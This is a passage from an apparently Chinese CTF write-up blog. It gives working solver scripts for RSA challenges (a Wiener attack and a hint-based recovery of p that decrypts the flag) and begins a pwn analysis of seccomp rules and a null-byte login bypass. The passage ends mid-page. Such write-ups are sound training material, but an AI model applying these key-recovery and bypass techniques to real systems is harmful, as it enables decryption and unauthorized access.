class="line"></span><br><span class="line">p=getPrime(<span class="number">2048</span>)</span><br><span class="line">q=getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e, d = get_ed(p, q)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n: &quot;</span>, <span class="built_in">hex</span>(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;e: &quot;</span>, <span class="built_in">hex</span>(e)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">enc_flag = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Your flag is: &quot;</span>, <span class="built_in">hex</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><ul><li>由题目可知，这道题的不同之处在于e是由特殊方法生成的。而条件中$u\lt\frac {1}{4}n$，我们可以对t进行wiener攻击。且维纳攻击时，是将$\phi(n)$爆破出来的，所以稍微修改<code>hackRSA</code>函数，让其返回$\varphi(n)$即可。</li><li><p>然后通过逆元计算出d，直接解密即可。这道题的出题人博客：<a href="https://www.secpulse.com/archives/53600.html。虽然我也不知道为啥需要分解p、q的算法，但是以后可能用得着就先记录在这里了。">https://www.secpulse.com/archives/53600.html。虽然我也不知道为啥需要分解p、q的算法，但是以后可能用得着就先记录在这里了。</a></p></li><li><p>wiener攻击项目：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd, n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x57b08bc1c82237cf614735562d4fe2a07570813b6c726537f83449df9be01e538bb765993001658f3c879f189620ad628517dda951a0103a88f7b28a9ee631fc365ee3e9f0ce558cf20eac76893bb7c0b49ed68506fcba1bb341eca59e7a2e4ce9bd31bfc03d6037cd565b6eae375e0e0b9084a352e820e02405597845871f62ee92eeba2f8de71f8af784a51ca83bd767b4f52908a853aae6efbf58db16a14c1fbf51c47f9613e21906f16fe14595d706f75555462cc7aea6b62ef558c6b74329ad182b308122f99cab95bc93ba6f9f9cfd29407b582404bfb11b45e1d5fa13372c174395306a6eb5c60651736f776e353b2eb8da356bded79bea7e4a1e212ac37b1d59e1356fcbcec8065642c318b1e908f54745aa7467c680ed6f2716fb3efd9843122dccbbdb6698fe1e31a2390682e03d175e0bf7591b8201ad14d1d8f02a3fcbea0b864e52895e588390e4a785ce94bf0b5b7b6a59c5f92ae214b846ffebf52b5a71dc286adc4d1755acd6b9e1b9e41cf0b1267c6433dabb708828d5b5b16638299b76c1645988e974b0f0215f8eee31f44503624d75b67519ad5c50e9924006bd64869d1a822cf927effedd570f4cbe110d8478e1ac10c95b754f05151b7eb146c226fa443655a12af864bdb3d30fce492840763775e487dd963b5fb292fbd8ca702c1be458d941177782f96edf489d021312cb082f9e01a824440e07</span></span><br><span class="line">e = <span class="number">0x77859f7f91ed390f5a7f6fdf76824c0468ae4bcde36f86fdca3a773915af3c9a8d173fcfd71a0e7782166147ca46e6d6fc32f91e6db3585d9998246dfcb163cdf9f9bad948daf005299a3c92eeef4a1ce2e78f5428608856c8b88ff3ff7b8fc3bd1a50ecbc10af5992801a0ccf92f00347a107e6856b97a16ead0f8143bd95b4614f1ba8836bb281ca2a01910c78fa99d7b7b25a224baa8403975e48105b7afd5d07d745d2be993e14c14c3de7c9b53e8d3e70420e182dbbc1b85347a517f7d93ebbcf8c0c41c234aefaa434bdad4db01ba50d8a596bf96b42da77f476056871b50d1eea18825dfe0741dba92daf33aef3b0dda2fa63a92a3cf8745044285c6c6f063754e2fe711b6dfe0557415be5dfe5b037fcce577428beada47b61a780e69a0273da11e4f0b236f3e39d471ddd17b40a7e6b05918acc668a379e17c3e857423b30699401d468b4aef7b8fa60c4dedfdb1092f46f83fecda984836b23e20436b88e5eea9d71198b966c0a0126e5063e182d822c1b72c39078a173a207677dca0599024f573f2d237177c7b70b7286c80dddd89838ba7f16e85b8ce57bc5ecf079b9cc4d9d8d633ec75d13ca1630e3ba83edbead13e50ba8ec9b68424aa88d455cdf566b607308f02e326f4d6a7673a4e2fa342b725b98a4798a54ca974cf2c28d0e79a622a19a26f1ff6340c831d08b3fdadbe48d162b1e57952bc9bbb643</span></span><br><span class="line">cipher = <span class="number">0x9eed6ec9e43e4405c0dc6f62b7ceab3f9c744d64c4262848739447924e55e2c0462d50a7b528bd4dbee136ec8725a8374078a277786e1167c08fb0bfe8fe76c94f291f56a6a478e9d9e000efd09381f228d9567132dec682413ab38483734d31c37f127dc9e172f3aab101edc2a2ba843ecf3f9f76ba7a52dc99ad63c307cb4a9183109b5b67d51c30c5e7279012c0e234c2e8c3ff182bb398e7f69c29bf1fa950d2158fb98086c5a829a6b4616f1488df7d80346805975e39d1e3e96c5dfd5e01239ec6a5a9b0391ec5b9c0b0def3f4c688ec4d54f5a96d7121d6980d80e896aec740e86567500efc21c4adc000ea19dfab5c68e5d07bef977acedfdc3d647cdf491c8aee9d96b7445d3a8df1ee3229ed23542b8e632a77e9778482908c297858e17f3964e2d82077c76036bd01db5bec483308d651f7b1e5a9c3fe2e2678331929d01e81a488b10ac5c0723e9cf586acaa2d9f061db291bb83e41f94f98a7b8ea5939ddc91c4de57a9271b71dab42d3cf8b6b0b35dbea8d6d564aba05fdbaad82846e29c37cec8b994c209be616ae167bfea11d97297ddd46a61264ae0c0fbb129bd20d12f9a6b3b7a162e1978151b2191406fbad79775a26a122724f5d5194a6362b62bd070f8e36efec0a507e5c8b92fbd69f0ba76584c260766cc6d99b3933e9d2d77f0d06bab7469dd612d79563084bfd886edb129b5f5d2eb00c3ed</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d-<span class="number">1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=-<span class="number">1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d, phi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pi_b</span>(<span class="params">x</span>):</span></span><br><span class="line">bt = <span class="number">536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273</span></span><br><span class="line"><span class="keyword">return</span> invmod(x, bt)</span><br><span class="line"></span><br><span class="line">t = pi_b(e)</span><br><span class="line">phi = hack_RSA(t, n)[<span class="number">1</span>]</span><br><span class="line">d = invmod(e, phi)</span><br><span class="line"></span><br><span class="line">res = powmod(cipher, d, n)</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(res)))</span><br></pre></td></tr></table></figure><h3 id="easy-pow"><a href="#easy-pow" class="headerlink" title="easy_pow"></a>easy_pow</h3><ul><li>这道题是[羊城杯 2020]Power原题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm, invert </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">4</span>*q</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">hint1 = (invert(e, lcm(p - <span class="number">1</span>, q - <span class="number">1</span>))) % (p - <span class="number">1</span>) </span><br><span class="line"><span class="built_in">print</span>(hint1)</span><br><span class="line"></span><br><span class="line">b = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">a = <span class="number">2021</span>*p**<span class="number">3</span> + <span class="number">2022</span> + <span class="number">2023</span>*p**<span class="number">4</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="built_in">pow</span>(<span class="number">2</span>, a, b)</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span></span><br><span class="line"><span class="comment"># hint1 = 5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span></span><br><span class="line"><span class="comment"># hint2 = 70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span></span><br></pre></td></tr></table></figure><ul><li>首先看hint2，这是一个简单的离散对数的问题，这里我们先使用<code>spmpy</code>库将指数求解出来之后，再使用方程式求解：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line">b = </span><br><span class="line">hint2 = </span><br><span class="line"></span><br><span class="line">x = discrete_log(b, hint2, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sage: x = </span><br><span class="line">sage: b = </span><br><span class="line">sage: R.&lt;p&gt;=Zmod(b)[]</span><br><span class="line">sage: f = 2021*p*p*p + 2022 + 2023*p*p*p*p - x</span><br><span class="line">sage: f.roots()</span><br></pre></td></tr></table></figure><ul><li>也可以直接求解，但是因为前面是有限域下的高次方程，直接求解的情况可能比较局限：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sage: b = </span><br><span class="line">sage: hint2 = </span><br><span class="line">sage: x = discrete_log(hint2, mod(2, b))</span><br><span class="line">sage: var(&#x27;p&#x27;)</span><br><span class="line">sage: solve([2021*p*p*p+2022+2023*p*p*p*p==x],p)</span><br></pre></td></tr></table></figure><ul><li>解得p值为（其余三个解都为分数）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497</span><br></pre></td></tr></table></figure><ul><li>接下来就是已知hint1，如何通过p求解了：</li></ul><script type="math/tex; mode=display">c=m^{e}\pmod n\\c^{hint1}=m^{e*hint1}\pmod n\\</script><script type="math/tex; mode=display">\begin{align}c^{hint1}&=m^{e*hint1}+k*n\\&=m^{e*hint1}+k*p\\\end{align}</script><ul><li>所以有：</li></ul><script type="math/tex; mode=display">c^{hint1}=m^{e*hint1}\pmod p</script><ul><li>由于：</li></ul><script type="math/tex; mode=display">e*hint1=1+k*lcm(p-1, q-1)</script><ul><li>易知$p-1|lcm(p-1,q-1)$，所以：</li></ul><script type="math/tex; mode=display">e*hint1=1\pmod {p-1}</script><ul><li>那么就构成了新的rsa公式，模为p、加密指数e、解密指数hint1、$\varphi(n)=p-1$，前提为$m\lt p$。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c = <span class="number">70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span></span><br><span class="line">p = <span class="number">9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497</span></span><br><span class="line">hint1 = <span class="number">5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, hint1, p)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;24uz5n82476b3315k6m8rk333b37pa22&#125;</span><br></pre></td></tr></table></figure><ul><li>ps：这道题前面一直做不出来，发现解出来的p位数有问题，后面去群里问了大佬才知道hint2和c的位置错了=-=</li></ul><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h3><ul><li><p>参考链接：<a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p></li><li><p>使用<code>seccomp-tool</code>检查禁用函数，简介链接：<a href="http://pollux.cc/2019/09/22/seccomp%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%20&amp;%202019ByteCTF%20VIP/">http://pollux.cc/2019/09/22/seccomp%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%20&amp;%202019ByteCTF%20VIP/</a></p><ul><li><code>seccomp-tool</code>安装：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure><ul><li>重点关注<code>PR_SET_NO_NEW_PRIVS(38)</code>和<code>PR_SET_SECCOMP(22)</code>标志位：<ul><li><code>PR_SET_NO_NEW_PRIVS</code>的第二个参数若设置为1，那么程序线程将不能通过执行<code>execve</code>系统调用来获得提权，该选项只对<code>execve</code>这个系统调用有效。</li><li>如果参数2为<code>SECCOMP_MODE_STRICT(1)</code>，则只允许调用<code>read</code>、<code>write</code>、<code>_exit(not exit_group)</code>、<code>sigreturn</code>这几个<code>syscall</code>。如果参数2为<code>SECCOMP_MODE_FILTER(2)</code>，则为过滤模式,其中对<code>syscall</code>的限制通过参数3的结构体，来自定义过滤规则。</li></ul></li></ul></li><li><p>关注禁用函数，首先不能提权，其次使用自定义禁用的结构体v4：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_27E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 *v2; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int64 v3[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)mmap((<span class="keyword">void</span> *)<span class="number">0x23330000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != <span class="number">590544896</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)<span class="number">0x23330000</span>, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">0x3B01020015</span>LL;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">32LL</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">0xB00010015</span>LL;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">6LL</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">0x7FFF000000000006</span>LL;</span><br><span class="line">  v1 = <span class="number">5</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;unk_50A0, <span class="number">0x61</span>u, <span class="number">0x500</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>禁止使用<code>execve</code>函数和<code>mprotect</code>函数：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % seccomp-tools dump ./datasystem </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x01 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0004 <span class="keyword">else</span> goto 0003</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x0000000b  <span class="keyword">if</span> (A == 11) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><ul><li><p>并且存在一个出题人留给我们的rwx区域，这样我们就可以不用使用<code>mprotect</code>函数修改区域属性了：</p></li><li><p>看一下<code>mmap</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize);</span><br></pre></td></tr></table></figure><ul><li>用来将某个文件内容映射到内存中，对该内存区域的存取即是直接对该文件内容的读写。</li><li>返回值：若映射成功则返回映射区的内存起始地址，否则返回<code>MAP_FAILED(-1)</code>，错误原因存于<code>errno</code>中。</li></ul></li><li><p>发现<code>check</code>函数，截取首尾两部分：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_2170</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">  v67 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(__m128i *)s2 = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_3100);</span><br><span class="line">  v66 = <span class="number">0</span>;</span><br><span class="line">  p_src = &amp;src;</span><br><span class="line">  si128 = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_3110);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;please input username: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;please input password: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, &amp;src, <span class="number">0x20</span>uLL);</span><br><span class="line">  v2 = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_30E0);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LABEL_18:</span><br><span class="line">  s1 = v52;</span><br><span class="line">  v59 = v53;</span><br><span class="line">  v60 = v54;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(buf, <span class="string">&quot;admin&quot;</span>) || (v21 = <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s1, s2), v22 = <span class="number">1</span>, v21) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Login Fail&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>中间的加密过程过于复杂，但是可以看到最后进行了用户名和密码的判断。且由于没有调用<code>memset</code>函数，导致可能存在脏数据，而且调用的是<code>read</code>函数，不会在读入字符的最后加上截断，所以这里我们需要输入<code>admin\x00</code>。</p></li><li><p>由于这里<code>strcmp((const char *)&amp;s1, s2)</code>语句中，存在栈内参数<code>s2</code>，使用gdb进行调试比较麻烦，所以我们这里选择使用IDA进行远程调试：</p></li><li>选择Remote Linux debugger，并选择Debugger -&gt; Process options修改远程调试配置：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109271850286.png" alt="image-20210927094239129"></p><ul><li>在关键判断处下断点并运行，输入<code>admin/空</code>，显示s2为如下：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109271850287.png" alt="image-20210927093716189" style="zoom:50%;" /></p><ul><li>我们直接赋值这串<code>0ea1fb4edf4aae8fb2ee19fb2ee19cfbe362</code>为密码，再次进行调试，发现字符串<code>s2</code>的头位为<code>\0</code>，那么我们是否只要伪造<code>s1</code>的字符串头位为<code>\0</code>，就可以绕过检测。</li></ul><p><img 